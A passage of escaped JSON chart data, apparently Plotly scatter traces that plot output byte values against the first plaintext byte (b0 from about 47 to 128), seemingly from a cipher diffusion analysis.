15.047], \"y\": [143, 21, 21, 249, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=48\", \"type\": \"scatter\", \"x\": [0.048, 1.048, 2.048, 3.048, 4.048, 5.048, 6.048, 7.048, 8.048, 9.048, 10.048, 11.048, 12.048, 13.048, 14.048, 15.048], \"y\": [173, 4, 4, 202, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=49\", \"type\": \"scatter\", \"x\": [0.049, 1.049, 2.049, 3.049, 4.049, 5.049, 6.049, 7.049, 8.049, 9.049, 10.049, 11.049, 12.049, 13.049, 14.049, 15.049], \"y\": [48, 199, 199, 148, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=50\", \"type\": \"scatter\", \"x\": [0.05, 1.05, 2.05, 3.05, 4.05, 5.05, 6.05, 7.05, 8.05, 9.05, 10.05, 11.05, 12.05, 13.05, 14.05, 15.05], \"y\": [227, 35, 35, 163, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=51\", \"type\": \"scatter\", \"x\": [0.051000000000000004, 1.051, 2.051, 3.051, 4.051, 5.051, 6.051, 7.051, 8.051, 9.051, 10.051, 11.051, 12.051, 13.051, 14.051, 15.051], \"y\": [56, 195, 195, 152, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=52\", \"type\": \"scatter\", \"x\": [0.052000000000000005, 1.052, 2.052, 3.052, 4.052, 5.052, 6.052, 7.052, 8.052, 9.052, 10.052, 11.052, 12.052, 13.052, 14.052, 15.052], \"y\": [149, 24, 24, 238, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=53\", \"type\": \"scatter\", \"x\": [0.053, 1.053, 2.053, 3.053, 4.053, 5.053, 6.053, 7.053, 8.053, 9.053, 10.053, 11.053, 12.053, 13.053, 14.053, 15.053], \"y\": [146, 150, 150, 103, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=54\", \"type\": \"scatter\", \"x\": [0.054, 1.054, 2.054, 3.054, 4.054, 5.054, 6.054, 7.054, 8.054, 9.054, 10.054, 11.054, 12.054, 13.054, 14.054, 15.054], \"y\": [175, 5, 5, 201, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=55\", \"type\": \"scatter\", \"x\": [0.055, 1.055, 2.055, 3.055, 4.055, 5.055, 6.055, 7.055, 8.055, 9.055, 10.055, 11.055, 12.055, 13.055, 14.055, 15.055], \"y\": [138, 154, 154, 115, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=56\", \"type\": \"scatter\", \"x\": [0.056, 1.056, 2.056, 3.056, 4.056, 5.056, 6.056, 7.056, 8.056, 9.056, 10.056, 11.056, 12.056, 13.056, 14.056, 15.056], \"y\": [171, 7, 7, 207, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=57\", \"type\": \"scatter\", \"x\": [0.057, 1.057, 2.057, 3.057, 4.057, 5.057, 6.057, 7.057, 8.057, 9.057, 10.057, 11.057, 12.057, 13.057, 14.057, 15.057], \"y\": [129, 18, 18, 240, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=58\", \"type\": \"scatter\", \"x\": [0.058, 1.058, 2.058, 3.058, 4.058, 5.058, 6.058, 7.058, 8.058, 9.058, 10.058, 11.058, 12.058, 13.058, 14.058, 15.058], \"y\": [190, 128, 128, 93, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=59\", \"type\": \"scatter\", \"x\": [0.059000000000000004, 1.059, 2.059, 3.059, 4.059, 5.059, 6.059, 7.059, 8.059, 9.059, 10.059, 11.059, 12.059, 13.059, 14.059, 15.059], \"y\": [122, 226, 226, 251, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=60\", \"type\": \"scatter\", \"x\": [0.06, 1.06, 2.06, 3.06, 4.06, 5.06, 6.06, 7.06, 8.06, 9.06, 10.06, 11.06, 12.06, 13.06, 14.06, 15.06], \"y\": [104, 235, 235, 224, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=61\", \"type\": \"scatter\", \"x\": [0.061, 1.061, 2.061, 3.061, 4.061, 5.061, 6.061, 7.061, 8.061, 9.061, 10.061, 11.061, 12.061, 13.061, 14.061, 15.061], \"y\": [235, 39, 39, 175, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=62\", \"type\": \"scatter\", \"x\": [0.062, 1.062, 2.062, 3.062, 4.062, 5.062, 6.062, 7.062, 8.062, 9.062, 10.062, 11.062, 12.062, 13.062, 14.062, 15.062], \"y\": [218, 178, 178, 11, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=63\", \"type\": \"scatter\", \"x\": [0.063, 1.063, 2.063, 3.063, 4.063, 5.063, 6.063, 7.063, 8.063, 9.063, 10.063, 11.063, 12.063, 13.063, 14.063, 15.063], \"y\": [79, 117, 117, 89, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=64\", \"type\": \"scatter\", \"x\": [0.064, 1.064, 2.064, 3.064, 4.064, 5.064, 6.064, 7.064, 8.064, 9.064, 10.064, 11.064, 12.064, 13.064, 14.064, 15.064], \"y\": [183, 9, 9, 221, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=65\", \"type\": \"scatter\", \"x\": [0.065, 1.065, 2.065, 3.065, 4.065, 5.065, 6.065, 7.065, 8.065, 9.065, 10.065, 11.065, 12.065, 13.065, 14.065, 15.065], \"y\": [184, 131, 131, 88, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=66\", \"type\": \"scatter\", \"x\": [0.066, 1.066, 2.066, 3.066, 4.066, 5.066, 6.066, 7.066, 8.066, 9.066, 10.066, 11.066, 12.066, 13.066, 14.066, 15.066], \"y\": [253, 44, 44, 178, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=67\", \"type\": \"scatter\", \"x\": [0.067, 1.067, 2.067, 3.067, 4.067, 5.067, 6.067, 7.067, 8.067, 9.067, 10.067, 11.067, 12.067, 13.067, 14.067, 15.067], \"y\": [145, 26, 26, 232, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=68\", \"type\": \"scatter\", \"x\": [0.068, 1.068, 2.068, 3.068, 4.068, 5.068, 6.068, 7.068, 8.068, 9.068, 10.068, 11.068, 12.068, 13.068, 14.068, 15.068], \"y\": [147, 27, 27, 235, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=69\", \"type\": \"scatter\", \"x\": [0.069, 1.069, 2.069, 3.069, 4.069, 5.069, 6.069, 7.069, 8.069, 9.069, 10.069, 11.069, 12.069, 13.069, 14.069, 15.069], \"y\": [121, 110, 110, 116, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=70\", \"type\": \"scatter\", \"x\": [0.07, 1.07, 2.07, 3.07, 4.07, 5.07, 6.07, 7.07, 8.07, 9.07, 10.07, 11.07, 12.07, 13.07, 14.07, 15.07], \"y\": [17, 90, 90, 40, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=71\", \"type\": \"scatter\", \"x\": [0.07100000000000001, 1.071, 2.071, 3.071, 4.071, 5.071, 6.071, 7.071, 8.071, 9.071, 10.071, 11.071, 12.071, 13.071, 14.071, 15.071], \"y\": [254, 160, 160, 61, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=72\", \"type\": \"scatter\", \"x\": [0.07200000000000001, 1.072, 2.072, 3.072, 4.072, 5.072, 6.072, 7.072, 8.072, 9.072, 10.072, 11.072, 12.072, 13.072, 14.072, 15.072], \"y\": [1, 82, 82, 48, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=73\", \"type\": \"scatter\", \"x\": [0.073, 1.073, 2.073, 3.073, 4.073, 5.073, 6.073, 7.073, 8.073, 9.073, 10.073, 11.073, 12.073, 13.073, 14.073, 15.073], \"y\": [211, 59, 59, 139, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=74\", \"type\": \"scatter\", \"x\": [0.074, 1.074, 2.074, 3.074, 4.074, 5.074, 6.074, 7.074, 8.074, 9.074, 10.074, 11.074, 12.074, 13.074, 14.074, 15.074], \"y\": [18, 214, 214, 167, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=75\", \"type\": \"scatter\", \"x\": [0.075, 1.075, 2.075, 3.075, 4.075, 5.075, 6.075, 7.075, 8.075, 9.075, 10.075, 11.075, 12.075, 13.075, 14.075, 15.075], \"y\": [216, 179, 179, 8, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=76\", \"type\": \"scatter\", \"x\": [0.076, 1.076, 2.076, 3.076, 4.076, 5.076, 6.076, 7.076, 8.076, 9.076, 10.076, 11.076, 12.076, 13.076, 14.076, 15.076], \"y\": [247, 41, 41, 189, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=77\", \"type\": \"scatter\", \"x\": [0.077, 1.077, 2.077, 3.077, 4.077, 5.077, 6.077, 7.077, 8.077, 9.077, 10.077, 11.077, 12.077, 13.077, 14.077, 15.077], \"y\": [120, 227, 227, 248, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=78\", \"type\": \"scatter\", \"x\": [0.078, 1.078, 2.078, 3.078, 4.078, 5.078, 6.078, 7.078, 8.078, 9.078, 10.078, 11.078, 12.078, 13.078, 14.078, 15.078], \"y\": [251, 47, 47, 183, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=79\", \"type\": \"scatter\", \"x\": [0.079, 1.079, 2.079, 3.079, 4.079, 5.079, 6.079, 7.079, 8.079, 9.079, 10.079, 11.079, 12.079, 13.079, 14.079, 15.079], \"y\": [182, 132, 132, 81, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=80\", \"type\": \"scatter\", \"x\": [0.08, 1.08, 2.08, 3.08, 4.08, 5.08, 6.08, 7.08, 8.08, 9.08, 10.08, 11.08, 12.08, 13.08, 14.08, 15.08], \"y\": [3, 83, 83, 51, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=81\", \"type\": \"scatter\", \"x\": [0.081, 1.081, 2.081, 3.081, 4.081, 5.081, 6.081, 7.081, 8.081, 9.081, 10.081, 11.081, 12.081, 13.081, 14.081, 15.081], \"y\": [28, 209, 209, 174, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=82\", \"type\": \"scatter\", \"x\": [0.082, 1.082, 2.082, 3.082, 4.082, 5.082, 6.082, 7.082, 8.082, 9.082, 10.082, 11.082, 12.082, 13.082, 14.082, 15.082], \"y\": [165, 0, 0, 198, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=83\", \"type\": \"scatter\", \"x\": [0.083, 1.083, 2.083, 3.083, 4.083, 5.083, 6.083, 7.083, 8.083, 9.083, 10.083, 11.083, 12.083, 13.083, 14.083, 15.083], \"y\": [100, 237, 237, 234, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=84\", \"type\": \"scatter\", \"x\": [0.084, 1.084, 2.084, 3.084, 4.084, 5.084, 6.084, 7.084, 8.084, 9.084, 10.084, 11.084, 12.084, 13.084, 14.084, 15.084], \"y\": [229, 32, 32, 166, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=85\", \"type\": \"scatter\", \"x\": [0.085, 1.085, 2.085, 3.085, 4.085, 5.085, 6.085, 7.085, 8.085, 9.085, 10.085, 11.085, 12.085, 13.085, 14.085, 15.085], \"y\": [70, 252, 252, 217, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=86\", \"type\": \"scatter\", \"x\": [0.08600000000000001, 1.086, 2.086, 3.086, 4.086, 5.086, 6.086, 7.086, 8.086, 9.086, 10.086, 11.086, 12.086, 13.086, 14.086, 15.086], \"y\": [220, 177, 177, 14, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=87\", \"type\": \"scatter\", \"x\": [0.08700000000000001, 1.087, 2.087, 3.087, 4.087, 5.087, 6.087, 7.087, 8.087, 9.087, 10.087, 11.087, 12.087, 13.087, 14.087, 15.087], \"y\": [19, 91, 91, 43, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=88\", \"type\": \"scatter\", \"x\": [0.088, 1.088, 2.088, 3.088, 4.088, 5.088, 6.088, 7.088, 8.088, 9.088, 10.088, 11.088, 12.088, 13.088, 14.088, 15.088], \"y\": [113, 106, 106, 120, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=89\", \"type\": \"scatter\", \"x\": [0.089, 1.089, 2.089, 3.089, 4.089, 5.089, 6.089, 7.089, 8.089, 9.089, 10.089, 11.089, 12.089, 13.089, 14.089, 15.089], \"y\": [40, 203, 203, 128, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=90\", \"type\": \"scatter\", \"x\": [0.09, 1.09, 2.09, 3.09, 4.09, 5.09, 6.09, 7.09, 8.09, 9.09, 10.09, 11.09, 12.09, 13.09, 14.09, 15.09], \"y\": [194, 190, 190, 31, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=91\", \"type\": \"scatter\", \"x\": [0.091, 1.091, 2.091, 3.091, 4.091, 5.091, 6.091, 7.091, 8.091, 9.091, 10.091, 11.091, 12.091, 13.091, 14.091, 15.091], \"y\": [215, 57, 57, 141, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=92\", \"type\": \"scatter\", \"x\": [0.092, 1.092, 2.092, 3.092, 4.092, 5.092, 6.092, 7.092, 8.092, 9.092, 10.092, 11.092, 12.092, 13.092, 14.092, 15.092], \"y\": [49, 74, 74, 24, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=93\", \"type\": \"scatter\", \"x\": [0.093, 1.093, 2.093, 3.093, 4.093, 5.093, 6.093, 7.093, 8.093, 9.093, 10.093, 11.093, 12.093, 13.093, 14.093, 15.093], \"y\": [61, 76, 76, 18, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=94\", \"type\": \"scatter\", \"x\": [0.094, 1.094, 2.094, 3.094, 4.094, 5.094, 6.094, 7.094, 8.094, 9.094, 10.094, 11.094, 12.094, 13.094, 14.094, 15.094], \"y\": [21, 88, 88, 46, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=95\", \"type\": \"scatter\", \"x\": [0.095, 1.095, 2.095, 3.095, 4.095, 5.095, 6.095, 7.095, 8.095, 9.095, 10.095, 11.095, 12.095, 13.095, 14.095, 15.095], \"y\": [32, 207, 207, 140, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=96\", \"type\": \"scatter\", \"x\": [0.096, 1.096, 2.096, 3.096, 4.096, 5.096, 6.096, 7.096, 8.096, 9.096, 10.096, 11.096, 12.096, 13.096, 14.096, 15.096], \"y\": [30, 208, 208, 173, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=97\", \"type\": \"scatter\", \"x\": [0.097, 1.097, 2.097, 3.097, 4.097, 5.097, 6.097, 7.097, 8.097, 9.097, 10.097, 11.097, 12.097, 13.097, 14.097, 15.097], \"y\": [96, 239, 239, 236, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=98\", \"type\": \"scatter\", \"x\": [0.098, 1.098, 2.098, 3.098, 4.098, 5.098, 6.098, 7.098, 8.098, 9.098, 10.098, 11.098, 12.098, 13.098, 14.098, 15.098], \"y\": [234, 170, 170, 35, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=99\", \"type\": \"scatter\", \"x\": [0.099, 1.099, 2.099, 3.099, 4.099, 5.099, 6.099, 7.099, 8.099, 9.099, 10.099, 11.099, 12.099, 13.099, 14.099, 15.099], \"y\": [72, 251, 251, 208, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=100\", \"type\": \"scatter\", \"x\": [0.1, 1.1, 2.1, 3.1, 4.1, 5.1, 6.1, 7.1, 8.1, 9.1, 10.1, 11.1, 12.1, 13.1, 14.1, 15.1], \"y\": [35, 67, 67, 3, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=101\", \"type\": \"scatter\", \"x\": [0.101, 1.101, 2.101, 3.101, 4.101, 5.101, 6.101, 7.101, 8.101, 9.101, 10.101, 11.101, 12.101, 13.101, 14.101, 15.101], \"y\": [63, 77, 77, 17, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=102\", \"type\": \"scatter\", \"x\": [0.10200000000000001, 1.102, 2.102, 3.102, 4.102, 5.102, 6.102, 7.102, 8.102, 9.102, 10.102, 11.102, 12.102, 13.102, 14.102, 15.102], \"y\": [195, 51, 51, 147, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=103\", \"type\": \"scatter\", \"x\": [0.10300000000000001, 1.103, 2.103, 3.103, 4.103, 5.103, 6.103, 7.103, 8.103, 9.103, 10.103, 11.103, 12.103, 13.103, 14.103, 15.103], \"y\": [180, 133, 133, 82, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=104\", \"type\": \"scatter\", \"x\": [0.10400000000000001, 1.104, 2.104, 3.104, 4.104, 5.104, 6.104, 7.104, 8.104, 9.104, 10.104, 11.104, 12.104, 13.104, 14.104, 15.104], \"y\": [47, 69, 69, 9, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=105\", \"type\": \"scatter\", \"x\": [0.105, 1.105, 2.105, 3.105, 4.105, 5.105, 6.105, 7.105, 8.105, 9.105, 10.105, 11.105, 12.105, 13.105, 14.105, 15.105], \"y\": [76, 249, 249, 214, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=106\", \"type\": \"scatter\", \"x\": [0.106, 1.106, 2.106, 3.106, 4.106, 5.106, 6.106, 7.106, 8.106, 9.106, 10.106, 11.106, 12.106, 13.106, 14.106, 15.106], \"y\": [161, 2, 2, 192, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=107\", \"type\": \"scatter\", \"x\": [0.107, 1.107, 2.107, 3.107, 4.107, 5.107, 6.107, 7.107, 8.107, 9.107, 10.107, 11.107, 12.107, 13.107, 14.107, 15.107], \"y\": [91, 127, 127, 71, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=108\", \"type\": \"scatter\", \"x\": [0.108, 1.108, 2.108, 3.108, 4.108, 5.108, 6.108, 7.108, 8.108, 9.108, 10.108, 11.108, 12.108, 13.108, 14.108, 15.108], \"y\": [5, 80, 80, 54, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=109\", \"type\": \"scatter\", \"x\": [0.109, 1.109, 2.109, 3.109, 4.109, 5.109, 6.109, 7.109, 8.109, 9.109, 10.109, 11.109, 12.109, 13.109, 14.109, 15.109], \"y\": [221, 60, 60, 130, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=110\", \"type\": \"scatter\", \"x\": [0.11, 1.11, 2.11, 3.11, 4.11, 5.11, 6.11, 7.11, 8.11, 9.11, 10.11, 11.11, 12.11, 13.11, 14.11, 15.11], \"y\": [128, 159, 159, 124, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=111\", \"type\": \"scatter\", \"x\": [0.111, 1.111, 2.111, 3.111, 4.111, 5.111, 6.111, 7.111, 8.111, 9.111, 10.111, 11.111, 12.111, 13.111, 14.111, 15.111], \"y\": [238, 168, 168, 37, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=112\", \"type\": \"scatter\", \"x\": [0.112, 1.112, 2.112, 3.112, 4.112, 5.112, 6.112, 7.112, 8.112, 9.112, 10.112, 11.112, 12.112, 13.112, 14.112, 15.112], \"y\": [7, 81, 81, 53, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=113\", \"type\": \"scatter\", \"x\": [0.113, 1.113, 2.113, 3.113, 4.113, 5.113, 6.113, 7.113, 8.113, 9.113, 10.113, 11.113, 12.113, 13.113, 14.113, 15.113], \"y\": [248, 163, 163, 56, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=114\", \"type\": \"scatter\", \"x\": [0.114, 1.114, 2.114, 3.114, 4.114, 5.114, 6.114, 7.114, 8.114, 9.114, 10.114, 11.114, 12.114, 13.114, 14.114, 15.114], \"y\": [37, 64, 64, 6, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=115\", \"type\": \"scatter\", \"x\": [0.115, 1.115, 2.115, 3.115, 4.115, 5.115, 6.115, 7.115, 8.115, 9.115, 10.115, 11.115, 12.115, 13.115, 14.115, 15.115], \"y\": [160, 143, 143, 76, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=116\", \"type\": \"scatter\", \"x\": [0.116, 1.116, 2.116, 3.116, 4.116, 5.116, 6.116, 7.116, 8.116, 9.116, 10.116, 11.116, 12.116, 13.116, 14.116, 15.116], \"y\": [154, 146, 146, 107, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=117\", \"type\": \"scatter\", \"x\": [0.117, 1.117, 2.117, 3.117, 4.117, 5.117, 6.117, 7.117, 8.117, 9.117, 10.117, 11.117, 12.117, 13.117, 14.117, 15.117], \"y\": [132, 157, 157, 122, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=118\", \"type\": \"scatter\", \"x\": [0.11800000000000001, 1.118, 2.118, 3.118, 4.118, 5.118, 6.118, 7.118, 8.118, 9.118, 10.118, 11.118, 12.118, 13.118, 14.118, 15.118], \"y\": [213, 56, 56, 142, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=119\", \"type\": \"scatter\", \"x\": [0.11900000000000001, 1.119, 2.119, 3.119, 4.119, 5.119, 6.119, 7.119, 8.119, 9.119, 10.119, 11.119, 12.119, 13.119, 14.119, 15.119], \"y\": [84, 245, 245, 194, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=120\", \"type\": \"scatter\", \"x\": [0.12, 1.12, 2.12, 3.12, 4.12, 5.12, 6.12, 7.12, 8.12, 9.12, 10.12, 11.12, 12.12, 13.12, 14.12, 15.12], \"y\": [198, 188, 188, 25, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=121\", \"type\": \"scatter\", \"x\": [0.121, 1.121, 2.121, 3.121, 4.121, 5.121, 6.121, 7.121, 8.121, 9.121, 10.121, 11.121, 12.121, 13.121, 14.121, 15.121], \"y\": [210, 182, 182, 7, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=122\", \"type\": \"scatter\", \"x\": [0.122, 1.1219999999999999, 2.122, 3.122, 4.122, 5.122, 6.122, 7.122, 8.122, 9.122, 10.122, 11.122, 12.122, 13.122, 14.122, 15.122], \"y\": [10, 218, 218, 179, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=123\", \"type\": \"scatter\", \"x\": [0.123, 1.123, 2.123, 3.123, 4.123, 5.123, 6.123, 7.123, 8.123, 9.123, 10.123, 11.123, 12.123, 13.123, 14.123, 15.123], \"y\": [231, 33, 33, 165, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=124\", \"type\": \"scatter\", \"x\": [0.124, 1.124, 2.124, 3.124, 4.124, 5.124, 6.124, 7.124, 8.124, 9.124, 10.124, 11.124, 12.124, 13.124, 14.124, 15.124], \"y\": [133, 16, 16, 246, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=125\", \"type\": \"scatter\", \"x\": [0.125, 1.125, 2.125, 3.125, 4.125, 5.125, 6.125, 7.125, 8.125, 9.125, 10.125, 11.125, 12.125, 13.125, 14.125, 15.125], \"y\": [64, 255, 255, 220, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=126\", \"type\": \"scatter\", \"x\": [0.126, 1.126, 2.126, 3.126, 4.126, 5.126, 6.126, 7.126, 8.126, 9.126, 10.126, 11.126, 12.126, 13.126, 14.126, 15.126], \"y\": [88, 243, 243, 200, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=127\", \"type\": \"scatter\", \"x\": [0.127, 1.127, 2.127, 3.127, 4.127, 5.127, 6.127, 7.127, 8.127, 9.127, 10.127, 11.127, 12.127, 13.127, 14.127, 15.127], \"y\": [26, 210, 210, 171, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=128\", \"type\": \"scatter\", \"x\": [0.128, 1.1280000000000001, 2.128, 3.128, 4.128, 5.128, 6.128, 7.128, 8.128, 9.128, 10.128, 11.128, 12.128, 13.128, 14.128, 15.128], \"y\": [36, 205, 205, 138, 99, 